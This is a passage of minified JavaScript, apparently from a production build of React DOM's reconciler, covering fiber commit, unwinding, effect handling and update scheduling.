re(n),null;if(s=(n.flags&128)!==0,l=a.rendering,l===null)if(s)Et(a,!1);else{if(q!==0||e!==null&&e.flags&128)for(e=n.child;e!==null;){if(l=rr(e),l!==null){for(n.flags|=128,Et(a,!1),s=l.updateQueue,s!==null&&(n.updateQueue=s,n.flags|=4),n.subtreeFlags=0,s=t,t=n.child;t!==null;)a=t,e=s,a.flags&=14680066,l=a.alternate,l===null?(a.childLanes=0,a.lanes=e,a.child=null,a.subtreeFlags=0,a.memoizedProps=null,a.memoizedState=null,a.updateQueue=null,a.dependencies=null,a.stateNode=null):(a.childLanes=l.childLanes,a.lanes=l.lanes,a.child=l.child,a.subtreeFlags=0,a.deletions=null,a.memoizedProps=l.memoizedProps,a.memoizedState=l.memoizedState,a.updateQueue=l.updateQueue,a.type=l.type,e=l.dependencies,a.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext}),t=t.sibling;return I(F,F.current&1|2),n.child}e=e.sibling}a.tail!==null&&G()>pt&&(n.flags|=128,s=!0,Et(a,!1),n.lanes=4194304)}else{if(!s)if(e=rr(l),e!==null){if(n.flags|=128,s=!0,t=e.updateQueue,t!==null&&(n.updateQueue=t,n.flags|=4),Et(a,!0),a.tail===null&&a.tailMode==="hidden"&&!l.alternate&&!B)return re(n),null}else 2*G()-a.renderingStartTime>pt&&t!==1073741824&&(n.flags|=128,s=!0,Et(a,!1),n.lanes=4194304);a.isBackwards?(l.sibling=n.child,n.child=l):(t=a.last,t!==null?t.sibling=l:n.child=l,a.last=l)}return a.tail!==null?(n=a.tail,a.rendering=n,a.tail=n.sibling,a.renderingStartTime=G(),n.sibling=null,t=F.current,I(F,s?t&1|2:t&1),n):(re(n),null);case 22:case 23:return Wl(),s=n.memoizedState!==null,e!==null&&e.memoizedState!==null!==s&&(n.flags|=8192),s&&n.mode&1?ge&1073741824&&(re(n),n.subtreeFlags&6&&(n.flags|=8192)):re(n),null;case 24:return null;case 25:return null}throw Error(b(156,n.tag))}function th(e,n){switch(El(n),n.tag){case 1:return fe(n.type)&&Zs(),e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 3:return ct(),z(he),z(le),Al(),e=n.flags,e&65536&&!(e&128)?(n.flags=e&-65537|128,n):null;case 5:return Rl(n),null;case 13:if(z(F),e=n.memoizedState,e!==null&&e.dehydrated!==null){if(n.alternate===null)throw Error(b(340));it()}return e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 19:return z(F),null;case 4:return ct(),null;case 10:return Pl(n.type._context),null;case 22:case 23:return Wl(),null;case 24:return null;default:return null}}var Cs=!1,ae=!1,sh=typeof WeakSet=="function"?WeakSet:Set,T=null;function Zn(e,n){var t=e.ref;if(t!==null)if(typeof t=="function")try{t(null)}catch(s){V(e,n,s)}else t.current=null}function $a(e,n,t){try{t()}catch(s){V(e,n,s)}}var Ji=!1;function rh(e,n){if(Pa=Qs,e=bc(),xl(e)){if("selectionStart"in e)var t={start:e.selectionStart,end:e.selectionEnd};else e:{t=(t=e.ownerDocument)&&t.defaultView||window;var s=t.getSelection&&t.getSelection();if(s&&s.rangeCount!==0){t=s.anchorNode;var r=s.anchorOffset,a=s.focusNode;s=s.focusOffset;try{t.nodeType,a.nodeType}catch{t=null;break e}var l=0,i=-1,o=-1,u=0,g=0,f=e,m=null;n:for(;;){for(var v;f!==t||r!==0&&f.nodeType!==3||(i=l+r),f!==a||s!==0&&f.nodeType!==3||(o=l+s),f.nodeType===3&&(l+=f.nodeValue.length),(v=f.firstChild)!==null;)m=f,f=v;for(;;){if(f===e)break n;if(m===t&&++u===r&&(i=l),m===a&&++g===s&&(o=l),(v=f.nextSibling)!==null)break;f=m,m=f.parentNode}f=v}t=i===-1||o===-1?null:{start:i,end:o}}else t=null}t=t||{start:0,end:0}}else t=null;for(La={focusedElem:e,selectionRange:t},Qs=!1,T=n;T!==null;)if(n=T,e=n.child,(n.subtreeFlags&1028)!==0&&e!==null)e.return=n,T=e;else for(;T!==null;){n=T;try{var k=n.alternate;if(n.flags&1024)switch(n.tag){case 0:case 11:case 15:break;case 1:if(k!==null){var w=k.memoizedProps,E=k.memoizedState,d=n.stateNode,p=d.getSnapshotBeforeUpdate(n.elementType===n.type?w:Ne(n.type,w),E);d.__reactInternalSnapshotBeforeUpdate=p}break;case 3:var h=n.stateNode.containerInfo;h.nodeType===1?h.textContent="":h.nodeType===9&&h.documentElement&&h.removeChild(h.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(b(163))}}catch(y){V(n,n.return,y)}if(e=n.sibling,e!==null){e.return=n.return,T=e;break}T=n.return}return k=Ji,Ji=!1,k}function It(e,n,t){var s=n.updateQueue;if(s=s!==null?s.lastEffect:null,s!==null){var r=s=s.next;do{if((r.tag&e)===e){var a=r.destroy;r.destroy=void 0,a!==void 0&&$a(n,t,a)}r=r.next}while(r!==s)}}function xr(e,n){if(n=n.updateQueue,n=n!==null?n.lastEffect:null,n!==null){var t=n=n.next;do{if((t.tag&e)===e){var s=t.create;t.destroy=s()}t=t.next}while(t!==n)}}function Ga(e){var n=e.ref;if(n!==null){var t=e.stateNode;switch(e.tag){case 5:e=t;break;default:e=t}typeof n=="function"?n(e):n.current=e}}function vu(e){var n=e.alternate;n!==null&&(e.alternate=null,vu(n)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(n=e.stateNode,n!==null&&(delete n[ze],delete n[Kt],delete n[Ra],delete n[Fd],delete n[Ud])),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}function yu(e){return e.tag===5||e.tag===3||e.tag===4}function eo(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||yu(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function Qa(e,n,t){var s=e.tag;if(s===5||s===6)e=e.stateNode,n?t.nodeType===8?t.parentNode.insertBefore(e,n):t.insertBefore(e,n):(t.nodeType===8?(n=t.parentNode,n.insertBefore(e,t)):(n=t,n.appendChild(e)),t=t._reactRootContainer,t!=null||n.onclick!==null||(n.onclick=qs));else if(s!==4&&(e=e.child,e!==null))for(Qa(e,n,t),e=e.sibling;e!==null;)Qa(e,n,t),e=e.sibling}function Ya(e,n,t){var s=e.tag;if(s===5||s===6)e=e.stateNode,n?t.insertBefore(e,n):t.appendChild(e);else if(s!==4&&(e=e.child,e!==null))for(Ya(e,n,t),e=e.sibling;e!==null;)Ya(e,n,t),e=e.sibling}var ee=null,Oe=!1;function Xe(e,n,t){for(t=t.child;t!==null;)ku(e,n,t),t=t.sibling}function ku(e,n,t){if(Be&&typeof Be.onCommitFiberUnmount=="function")try{Be.onCommitFiberUnmount(fr,t)}catch{}switch(t.tag){case 5:ae||Zn(t,n);case 6:var s=ee,r=Oe;ee=null,Xe(e,n,t),ee=s,Oe=r,ee!==null&&(Oe?(e=ee,t=t.stateNode,e.nodeType===8?e.parentNode.removeChild(t):e.removeChild(t)):ee.removeChild(t.stateNode));break;case 18:ee!==null&&(Oe?(e=ee,t=t.stateNode,e.nodeType===8?qr(e.parentNode,t):e.nodeType===1&&qr(e,t),Wt(e)):qr(ee,t.stateNode));break;case 4:s=ee,r=Oe,ee=t.stateNode.containerInfo,Oe=!0,Xe(e,n,t),ee=s,Oe=r;break;case 0:case 11:case 14:case 15:if(!ae&&(s=t.updateQueue,s!==null&&(s=s.lastEffect,s!==null))){r=s=s.next;do{var a=r,l=a.destroy;a=a.tag,l!==void 0&&(a&2||a&4)&&$a(t,n,l),r=r.next}while(r!==s)}Xe(e,n,t);break;case 1:if(!ae&&(Zn(t,n),s=t.stateNode,typeof s.componentWillUnmount=="function"))try{s.props=t.memoizedProps,s.state=t.memoizedState,s.componentWillUnmount()}catch(i){V(t,n,i)}Xe(e,n,t);break;case 21:Xe(e,n,t);break;case 22:t.mode&1?(ae=(s=ae)||t.memoizedState!==null,Xe(e,n,t),ae=s):Xe(e,n,t);break;default:Xe(e,n,t)}}function no(e){var n=e.updateQueue;if(n!==null){e.updateQueue=null;var t=e.stateNode;t===null&&(t=e.stateNode=new sh),n.forEach(function(s){var r=hh.bind(null,e,s);t.has(s)||(t.add(s),s.then(r,r))})}}function Le(e,n){var t=n.deletions;if(t!==null)for(var s=0;s<t.length;s++){var r=t[s];try{var a=e,l=n,i=l;e:for(;i!==null;){switch(i.tag){case 5:ee=i.stateNode,Oe=!1;break e;case 3:ee=i.stateNode.containerInfo,Oe=!0;break e;case 4:ee=i.stateNode.containerInfo,Oe=!0;break e}i=i.return}if(ee===null)throw Error(b(160));ku(a,l,r),ee=null,Oe=!1;var o=r.alternate;o!==null&&(o.return=null),r.return=null}catch(u){V(r,n,u)}}if(n.subtreeFlags&12854)for(n=n.child;n!==null;)wu(n,e),n=n.sibling}function wu(e,n){var t=e.alternate,s=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:if(Le(n,e),Ie(e),s&4){try{It(3,e,e.return),xr(3,e)}catch(w){V(e,e.return,w)}try{It(5,e,e.return)}catch(w){V(e,e.return,w)}}break;case 1:Le(n,e),Ie(e),s&512&&t!==null&&Zn(t,t.return);break;case 5:if(Le(n,e),Ie(e),s&512&&t!==null&&Zn(t,t.return),e.flags&32){var r=e.stateNode;try{Ft(r,"")}catch(w){V(e,e.return,w)}}if(s&4&&(r=e.stateNode,r!=null)){var a=e.memoizedProps,l=t!==null?t.memoizedProps:a,i=e.type,o=e.updateQueue;if(e.updateQueue=null,o!==null)try{i==="input"&&a.type==="radio"&&a.name!=null&&Ho(r,a),ya(i,l);var u=ya(i,a);for(l=0;l<o.length;l+=2){var g=o[l],f=o[l+1];g==="style"?Qo(r,f):g==="dangerouslySetInnerHTML"?$o(r,f):g==="children"?Ft(r,f):cl(r,g,f,u)}switch(i){case"input":ha(r,a);break;case"textarea":Vo(r,a);break;case"select":var m=r._wrapperState.wasMultiple;r._wrapperState.wasMultiple=!!a.multiple;var v=a.value;v!=null?Jn(r,!!a.multiple,v,!1):m!==!!a.multiple&&(a.defaultValue!=null?Jn(r,!!a.multiple,a.defaultValue,!0):Jn(r,!!a.multiple,a.multiple?[]:"",!1))}r[Kt]=a}catch(w){V(e,e.return,w)}}break;case 6:if(Le(n,e),Ie(e),s&4){if(e.stateNode===null)throw Error(b(162));r=e.stateNode,a=e.memoizedProps;try{r.nodeValue=a}catch(w){V(e,e.return,w)}}break;case 3:if(Le(n,e),Ie(e),s&4&&t!==null&&t.memoizedState.isDehydrated)try{Wt(n.containerInfo)}catch(w){V(e,e.return,w)}break;case 4:Le(n,e),Ie(e);break;case 13:Le(n,e),Ie(e),r=e.child,r.flags&8192&&(a=r.memoizedState!==null,r.stateNode.isHidden=a,!a||r.alternate!==null&&r.alternate.memoizedState!==null||(Hl=G())),s&4&&no(e);break;case 22:if(g=t!==null&&t.memoizedState!==null,e.mode&1?(ae=(u=ae)||g,Le(n,e),ae=u):Le(n,e),Ie(e),s&8192){if(u=e.memoizedState!==null,(e.stateNode.isHidden=u)&&!g&&e.mode&1)for(T=e,g=e.child;g!==null;){for(f=T=g;T!==null;){switch(m=T,v=m.child,m.tag){case 0:case 11:case 14:case 15:It(4,m,m.return);break;case 1:Zn(m,m.return);var k=m.stateNode;if(typeof k.componentWillUnmount=="function"){s=m,t=m.return;try{n=s,k.props=n.memoizedProps,k.state=n.memoizedState,k.componentWillUnmount()}catch(w){V(s,t,w)}}break;case 5:Zn(m,m.return);break;case 22:if(m.memoizedState!==null){so(f);continue}}v!==null?(v.return=m,T=v):so(f)}g=g.sibling}e:for(g=null,f=e;;){if(f.tag===5){if(g===null){g=f;try{r=f.stateNode,u?(a=r.style,typeof a.setProperty=="function"?a.setProperty("display","none","important"):a.display="none"):(i=f.stateNode,o=f.memoizedProps.style,l=o!=null&&o.hasOwnProperty("display")?o.display:null,i.style.display=Go("display",l))}catch(w){V(e,e.return,w)}}}else if(f.tag===6){if(g===null)try{f.stateNode.nodeValue=u?"":f.memoizedProps}catch(w){V(e,e.return,w)}}else if((f.tag!==22&&f.tag!==23||f.memoizedState===null||f===e)&&f.child!==null){f.child.return=f,f=f.child;continue}if(f===e)break e;for(;f.sibling===null;){if(f.return===null||f.return===e)break e;g===f&&(g=null),f=f.return}g===f&&(g=null),f.sibling.return=f.return,f=f.sibling}}break;case 19:Le(n,e),Ie(e),s&4&&no(e);break;case 21:break;default:Le(n,e),Ie(e)}}function Ie(e){var n=e.flags;if(n&2){try{e:{for(var t=e.return;t!==null;){if(yu(t)){var s=t;break e}t=t.return}throw Error(b(160))}switch(s.tag){case 5:var r=s.stateNode;s.flags&32&&(Ft(r,""),s.flags&=-33);var a=eo(e);Ya(e,a,r);break;case 3:case 4:var l=s.stateNode.containerInfo,i=eo(e);Qa(e,i,l);break;default:throw Error(b(161))}}catch(o){V(e,e.return,o)}e.flags&=-3}n&4096&&(e.flags&=-4097)}function ah(e,n,t){T=e,bu(e)}function bu(e,n,t){for(var s=(e.mode&1)!==0;T!==null;){var r=T,a=r.child;if(r.tag===22&&s){var l=r.memoizedState!==null||Cs;if(!l){var i=r.alternate,o=i!==null&&i.memoizedState!==null||ae;i=Cs;var u=ae;if(Cs=l,(ae=o)&&!u)for(T=r;T!==null;)l=T,o=l.child,l.tag===22&&l.memoizedState!==null?ro(r):o!==null?(o.return=l,T=o):ro(r);for(;a!==null;)T=a,bu(a),a=a.sibling;T=r,Cs=i,ae=u}to(e)}else r.subtreeFlags&8772&&a!==null?(a.return=r,T=a):to(e)}}function to(e){for(;T!==null;){var n=T;if(n.flags&8772){var t=n.alternate;try{if(n.flags&8772)switch(n.tag){case 0:case 11:case 15:ae||xr(5,n);break;case 1:var s=n.stateNode;if(n.flags&4&&!ae)if(t===null)s.componentDidMount();else{var r=n.elementType===n.type?t.memoizedProps:Ne(n.type,t.memoizedProps);s.componentDidUpdate(r,t.memoizedState,s.__reactInternalSnapshotBeforeUpdate)}var a=n.updateQueue;a!==null&&Fi(n,a,s);break;case 3:var l=n.updateQueue;if(l!==null){if(t=null,n.child!==null)switch(n.child.tag){case 5:t=n.child.stateNode;break;case 1:t=n.child.stateNode}Fi(n,l,t)}break;case 5:var i=n.stateNode;if(t===null&&n.flags&4){t=i;var o=n.memoizedProps;switch(n.type){case"button":case"input":case"select":case"textarea":o.autoFocus&&t.focus();break;case"img":o.src&&(t.src=o.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(n.memoizedState===null){var u=n.alternate;if(u!==null){var g=u.memoizedState;if(g!==null){var f=g.dehydrated;f!==null&&Wt(f)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(b(163))}ae||n.flags&512&&Ga(n)}catch(m){V(n,n.return,m)}}if(n===e){T=null;break}if(t=n.sibling,t!==null){t.return=n.return,T=t;break}T=n.return}}function so(e){for(;T!==null;){var n=T;if(n===e){T=null;break}var t=n.sibling;if(t!==null){t.return=n.return,T=t;break}T=n.return}}function ro(e){for(;T!==null;){var n=T;try{switch(n.tag){case 0:case 11:case 15:var t=n.return;try{xr(4,n)}catch(o){V(n,t,o)}break;case 1:var s=n.stateNode;if(typeof s.componentDidMount=="function"){var r=n.return;try{s.componentDidMount()}catch(o){V(n,r,o)}}var a=n.return;try{Ga(n)}catch(o){V(n,a,o)}break;case 5:var l=n.return;try{Ga(n)}catch(o){V(n,l,o)}}}catch(o){V(n,n.return,o)}if(n===e){T=null;break}var i=n.sibling;if(i!==null){i.return=n.return,T=i;break}T=n.return}}var lh=Math.ceil,ir=Ze.ReactCurrentDispatcher,Fl=Ze.ReactCurrentOwner,Te=Ze.ReactCurrentBatchConfig,j=0,J=null,Q=null,ne=0,ge=0,Xn=kn(0),q=0,ns=null,Mn=0,Sr=0,Ul=0,Dt=null,pe=null,Hl=0,pt=1/0,He=null,or=!1,Ka=null,dn=null,Ps=!1,rn=null,cr=0,zt=0,qa=null,Bs=-1,Fs=0;function oe(){return j&6?G():Bs!==-1?Bs:Bs=G()}function hn(e){return e.mode&1?j&2&&ne!==0?ne&-ne:Vd.transition!==null?(Fs===0&&(Fs=ac()),Fs):(e=M,e!==0||(e=window.event,e=e===void 0?16:dc(e.type)),e):1}function je(e,n,t,s){if(50<zt)throw zt=0,qa=null,Error(b(185));as(e,t,s),(!(j&2)||e!==J)&&(e===J&&(!(j&2)&&(Sr|=t),q===4&&tn(e,ne)),me(e,s),t===1&&j===0&&!(n.mode&1)&&(pt=G()+500,kr&&wn()))}function me(e,n){var t=e.callbackNode;Vp(e,n);var s=Gs(e,e===J?ne:0);if(s===0)t!==null&&hi(t),e.callbackNode=null,e.callbackPriority=0;else if(n=s&-s,e.callbackPriority!==n){if(t!=null&&hi(t),n===1)e.tag===0?Hd(ao.bind(null,e)):Oc(ao.bind(null,e)),zd(function(){!(j&6)&&wn()}),t=null;else{switch(lc(s)){case 1:t=fl;break;case 4:t=sc;break;case 16:t=$s;break;case 536870912:t=rc;break;default:t=$s}t=Lu(t,xu.bind(null,e))}e.callbackPriority=n,e.callbackNode=t}}function xu(e,n){if(Bs=-1,Fs=0,j&6)throw Error(b(327));var t=e.callbackNode;if(rt()&&e.callbackNode!==t)return null;var s=Gs(e,e===J?ne:0);if(s===0)return null;if(s&30||s&e.expiredLanes||n)n=ur(e,s);else{n=s;var r=j;j|=2;var a=Eu();(J!==e||ne!==n)&&(He=null,pt=G()+500,Nn(e,n));do try{ch();break}catch(i){Su(e,i)}while(!0);Cl(),ir.current=a,j=r,Q!==null?n=0:(J=null,ne=0,n=q)}if(n!==0){if(n===2&&(r=Sa(e),r!==0&&(s=r,n=Za(e,r))),n===1)throw t=ns,Nn(e,0),tn(e,s),me(e,G()),t;if(n===6)tn(e,s);else{if(r=e.current.alternate,!(s&30)&&!ih(r)&&(n=ur(e,s),n===2&&(a=Sa(e),a!==0&&(s=a,n=Za(e,a))),n===1))throw t=ns,Nn(e,0),tn(e,s),me(e,G()),t;switch(e.finishedWork=r,e.finishedLanes=s,n){case 0:case 1:throw Error(b(345));case 2:Tn(e,pe,He);break;case 3:if(tn(e,s),(s&130023424)===s&&(n=Hl+500-G(),10<n)){if(Gs(e,0)!==0)break;if(r=e.suspendedLanes,(r&s)!==s){oe(),e.pingedLanes|=e.suspendedLanes&r;break}e.timeoutHandle=Oa(Tn.bind(null,e,pe,He),n);break}Tn(e,pe,He);break;case 4:if(tn(e,s),(s&4194240)===s)break;for(n=e.eventTimes,r=-1;0<s;){var l=31-Ae(s);a=1<<l,l=n[l],l>r&&(r=l),s&=~a}if(s=r,s=G()-s,s=(120>s?120:480>s?480:1080>s?1080:1920>s?1920:3e3>s?3e3:4320>s?4320:1960*lh(s/1960))-s,10<s){e.timeoutHandle=Oa(Tn.bind(null,e,pe,He),s);break}Tn(e,pe,He);break;case 5:Tn(e,pe,He);break;default:throw Error(b(329))}}}return me(e,G()),e.callbackNode===t?xu.bind(null,e):null}function Za(e,n){var t=Dt;return e.current.memoizedState.isDehydrated&&(Nn(e,n).flags|=256),e=ur(e,n),e!==2&&(n=pe,pe=t,n!==null&&Xa(n)),e}function Xa(e){pe===null?pe=e:pe.push.apply(pe,e)}function ih(e){for(var n=e;;){if(n.flags&16384){var t=n.updateQueue;if(t!==null&&(t=t.stores,t!==null))for(var s=0;s<t.length;s++){var r=t[s],a=r.getSnapshot;r=r.value;try{if(!Me(a(),r))return!1}catch{return!1}}}if(t=n.child,n.subtreeFlags&16384&&t!==null)t.return=n,n=t;else{if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return!0;n=n.return}n.sibling.return=n.return,n=n.sibling}}return!0}function tn(e,n){for(n&=~Ul,n&=~Sr,e.suspendedLanes|=n,e.pingedLanes&=~n,e=e.expirationTimes;0<n;){var t=31-Ae(n),s=1<<t;e[t]=-1,n&=~s}}function ao(e){if(j&6)throw Error(b(327));rt();var n=Gs(e,0);if(!(n&1))return me(e,G()),null;var t=ur(e,n);if(e.tag!==0&&t===2){var s=Sa(e);s!==0&&(n=s,t=Za(e,s))}if(t===1)throw t=ns,Nn(e,0),tn(e,n),me(e,G()),t;if(t===6)throw Error(b(345));return e.finishedWork=e.current.alternate,e.finishedLanes=n,Tn(e,pe,He),me(e,G()),null}function Vl(e,n){var t=j;j|=1;try{return e(n)}finally{j=t,j===0&&(pt=G()+500,kr&&wn())}}function In(e){rn!==null&&rn.tag===0&&!(j&6)&&rt();var n=j;j|=1;var t=Te.transition,s=M;try{if(Te.transition=null,M=1,e)return e()}finally{M=s,Te.transition=t,j=n,!(j&6)&&wn()}}function Wl(){ge=Xn.current,z(Xn)}function Nn(e,n){e.finishedWork=null,e.finishedLanes=0;var t=e.timeoutHandle;if(t!==-1&&(e.timeoutHandle=-1,Dd(t)),Q!==null)for(t=Q.return;t!==null;){var s=t;switch(El(s),s.tag){case 1:s=s.type.childContextTypes,s!=null&&Zs();break;case 3:ct(),z(he),z(le),Al();break;case 5:Rl(s);break;case 4:ct();break;case 13:z(F);break;case 19:z(F);break;case 10:Pl(s.type._context);break;case 22:case 23:Wl()}t=t.return}if(J=e,Q=e=fn(e.current,null),ne=ge=n,q=0,ns=null,Ul=Sr=Mn=0,pe=Dt=null,Pn!==null){for(n=0;n<Pn.length;n++)if(t=Pn[n],s=t.interleaved,s!==null){t.interleaved=null;var r=s.next,a=t.pending;if(a!==null){var l=a.next;a.next=r,s.next=l}t.pending=s}Pn=null}return e}function Su(e,n){do{var t=Q;try{if(Cl(),Is.current=lr,ar){for(var s=U.memoizedState;s!==null;){var r=s.queue;r!==null&&(r.pending=null),s=s.next}ar=!1}if(jn=0,X=K=U=null,Mt=!1,Xt=0,Fl.current=null,t===null||t.return===null){q=1,ns=n,Q=null;break}e:{var a=e,l=t.return,i=t,o=n;if(n=ne,i.flags|=32768,o!==null&&typeof o=="object"&&typeof o.then=="function"){var u=o,g=i,f=g.tag;if(!(g.mode&1)&&(f===0||f===11||f===15)){var m=g.alternate;m?(g.updateQueue=m.updateQueue,g.memoizedState=m.memoizedState,g.lanes=m.lanes):(g.updateQueue=null,g.memoizedState=null)}var v=Gi(l);if(v!==null){v.flags&=-257,Qi(v,l,i,a,n),v.mode&1&&$i(a,u,n),n=v,o=u;var k=n.updateQueue;if(k===null){var w=new Set;w.add(o),n.updateQueue=w}else k.add(o);break e}else{if(!(n&1)){$i(a,u,n),$l();break e}o=Error(b(426))}}else if(B&&i.mode&1){var E=Gi(l);if(E!==null){!(E.flags&65536)&&(E.flags|=256),Qi(E,l,i,a,n),Tl(ut(o,i));break e}}a=o=ut(o,i),q!==4&&(q=2),Dt===null?Dt=[a]:Dt.push(a),a=l;do{switch(a.tag){case 3:a.flags|=65536,n&=-n,a.lanes|=n;var d=lu(a,o,n);Bi(a,d);break e;case 1:i=o;var p=a.type,h=a.stateNode;if(!(a.flags&128)&&(typeof p.getDerivedStateFromError=="function"||h!==null&&typeof h.componentDidCatch=="function"&&(dn===null||!dn.has(h)))){a.flags|=65536,n&=-n,a.lanes|=n;var y=iu(a,i,n);Bi(a,y);break e}}a=a.return}while(a!==null)}_u(t)}catch(S){n=S,Q===t&&t!==null&&(Q=t=t.return);continue}break}while(!0)}function Eu(){var e=ir.current;return ir.current=lr,e===null?lr:e}function $l(){(q===0||q===3||q===2)&&(q=4),J===null||!(Mn&268435455)&&!(Sr&268435455)||tn(J,ne)}function ur(e,n){var t=j;j|=2;var s=Eu();(J!==e||ne!==n)&&(He=null,Nn(e,n));do try{oh();break}catch(r){Su(e,r)}while(!0);if(Cl(),j=t,ir.current=s,Q!==null)throw Error(b(261));return J=null,ne=0,q}function oh(){for(;Q!==null;)Tu(Q)}function ch(){for(;Q!==null&&!jp();)Tu(Q)}function Tu(e){var n=Pu(e.alternate,e,ge);e.memoizedProps=e.pendingProps,n===null?_u(e):Q=n,Fl.current=null}function _u(e){var n=e;do{var t=n.alternate;if(e=n.return,n.flags&32768){if(t=th(t,n),t!==null){t.flags&=32767,Q=t;return}if(e!==null)e.flags|=32768,e.subtreeFlags=0,e.deletions=null;else{q=6,Q=null;return}}else if(t=nh(t,n,ge),t!==null){Q=t;return}if(n=n.sibling,n!==null){Q=n;return}Q=n=e}while(n!==null);q===0&&(q=5)}function Tn(e,n,t){var s=M,r=Te.transition;try{Te.transition=null,M=1,uh(e,n,t,s)}finally{Te.transition=r,M=s}return null}function uh(e,n,t,s){do rt();while(rn!==null);if(j&6)throw Error(b(327));t=e.finishedWork;var r=e.finishedLanes;if(t===null)return null;if(e.finishedWork=null,e.finishedLanes=0,t===e.current)throw Error(b(177));e.callbackNode=null,e.callbackPriority=0;var a=t.lanes|t.childLanes;if(Wp(e,a),e===J&&(Q=J=null,ne=0),!(t.subtreeFlags&2064)&&!(t.flags&2064)||Ps||(Ps=!0,Lu($s,function(){return rt(),null})),a=(t.flags&15990)!==0,t.subtreeFlags&15990||a){a=Te.transition,Te.transition=null;var l=M;M=1;var i=j;j|=4,Fl.current=null,rh(e,t),wu(t,e),Nd(La),Qs=!!Pa,La=Pa=null,e.current=t,ah(t),Mp(),j=i,M=l,Te.transition=a}else e.current=t;if(Ps&&(Ps=!1,rn=e,cr=r),a=e.pendingLanes,a===0&&(dn=null),zp(t.stateNode),me(e,G()),n!==null)for(s=e.onRecoverableError,t=0;t<n.length;t++)r=n[t],s(r.value,{componentStack:r.stack,digest:r.digest});if(or)throw or=!1,e=Ka,Ka=null,e;return cr&1&&e.tag!==0&&rt(),a=e.pendingLanes,a&1?e===qa?zt++:(zt=0,qa=e):zt=0,wn(),null}function rt(){if(rn!==null){var e=lc(cr),n=Te.transition,t=M;try{if(Te.transition=null,M=16>e?16:e,rn===null)var s=!1;else{if(e=rn,rn=null,cr=0,j&6)throw Error(b(331));var r=j;for(j|=4,T=e.current;T!==null;){var a=T,l=a.child;if(T.flags&16){var i=a.deletions;if(i!==null){for(var o=0;o<i.length;o++){var u=i[o];for(T=u;T!==null;){var g=T;switch(g.tag){case 0:case 11:case 15:It(8,g,a)}var f=g.child;if(f!==null)f.return=g,T=f;else for(;T!==null;){g=T;var m=g.sibling,v=g.return;if(vu(g),g===u){T=null;break}if(m!==null){m.return=v,T=m;break}T=v}}}var k=a.alternate;if(k!==null){var w=k.child;if(w!==null){k.child=null;do{var E=w.sibling;w.sibling=null,w=E}while(w!==null)}}T=a}}if(a.subtreeFlags&2064&&l!==null)l.return=a,T=l;else e:for(;T!==null;){if(a=T,a.flags&2048)switch(a.tag){case 0:case 11:case 15:It(9,a,a.return)}var d=a.sibling;if(d!==null){d.return=a.return,T=d;break e}T=a.return}}var p=e.current;for(T=p;T!==null;){l=T;var h=l.child;if(l.subtreeFlags&2064&&h!==null)h.return=l,T=h;else e:for(l=p;T!==null;){if(i=T,i.flags&2048)try{switch(i.tag){case 0:case 11:case 15:xr(9,i)}}catch(S){V(i,i.return,S)}if(i===l){T=null;break e}var y=i.sibling;if(y!==null){y.return=i.return,T=y;break e}T=i.return}}if(j=r,wn(),Be&&typeof Be.onPostCommitFiberRoot=="function")try{Be.onPostCommitFiberRoot(fr,e)}catch{}s=!0}return s}finally{M=t,Te.transition=n}}return!1}function lo(e,n,t){n=ut(t,n),n=lu(e,n,1),e=pn(e,n,1),n=oe(),e!==null&&(as(e,1,n),me(e,n))}function V(e,n,t){if(e.tag===3)lo(e,e,t);else for(;n!==null;){if(n.tag===3){lo(n,e,t);break}else if(n.tag===1){var s=n.stateNode;if(typeof n.type.getDerivedStateFromError=="function"||typeof s.componentDidCatch=="function"&&(dn===null||!dn.has(s))){e=ut(t,e),e=iu(n,e,1),n=pn(n,e,1),e=oe(),n!==null&&(as(n,1,e),me(n,e));break}}n=n.return}}function ph(e,n,t){var s=e.pingCache;s!==null&&s.delete(n),n=oe(),e.pingedLanes|=e.suspendedLanes&t,J===e&&(ne&t)===t&&(q===4||q===3&&(ne&130023424)===ne&&500>G()-Hl?Nn(e,0):Ul|=t),me(e,n)}function Cu(e,n){n===0&&(e.mode&1?(n=ys,ys<<=1,!(ys&130023424)&&(ys=4194304)):n=1);var t=oe();e=Ke(e,n),e!==null&&(as(e,n,t),me(e,t))}function dh(e){var n=e.memoizedState,t=0;n!==null&&(t=n.retryLane),Cu(e,t)}function hh(e,n){var t=0;switch(e.tag){case 13:var s=e.stateNode,r=e.memoizedState;r!==null&&(t=r.retryLane);break;case 19:s=e.stateNode;break;default:throw Error(b(314))}s!==null&&s.delete(n),Cu(e,t)}var Pu;Pu=function(e,n,t){if(e!==null)if(e.memoizedProps!==n.pendingProps||he.current)de=!0;else{if(!(e.lanes&t)&&!(n.flags&128))return de=!1,eh(e,n,t);de=!!(e.flags&131072)}else de=!1,B&&n.flags&1048576&&Rc(n,er,n.index);switch(n.lanes=0,n.tag){case 2:var s=n.type;zs(e,n),e=n.pendingProps;var r=lt(n,le.current);st(n,t),r=Ml(null,n,s,e,r,t);var a=Il();return n.flags|=1,typeof r=="object"&&r!==null&&typeof r.render=="function"&&r.$$typeof===void 0?(n.tag=1,n.memoizedState=null,n.updateQueue=null,fe(s)?(a=!0,Xs(n)):a=!1,n.memoizedState=r.state!==null&&r.state!==void 0?r.state:null,Nl(n),r.updater=br,n.stateNode=r,r._reactInternals=n,za(n,s,e,t),n=Ua(null,n,s,!0,a,t)):(n.tag=0,B&&a&&Sl(n),ie(null,n,r,t),n=n.child),n;case 16:s=n.elementType;e:{switch(zs(e,n),e=n.pendingProps,r=s._init,s=r(s._payload),n.type=s,r=n.tag=mh(s),e=Ne(s,e),r){case 0:n=Fa(null,n,s,e,t);break e;case 1:n=qi(null,n,s,e,t);break e;case 11:n=Yi(null,n,s,e,t);break 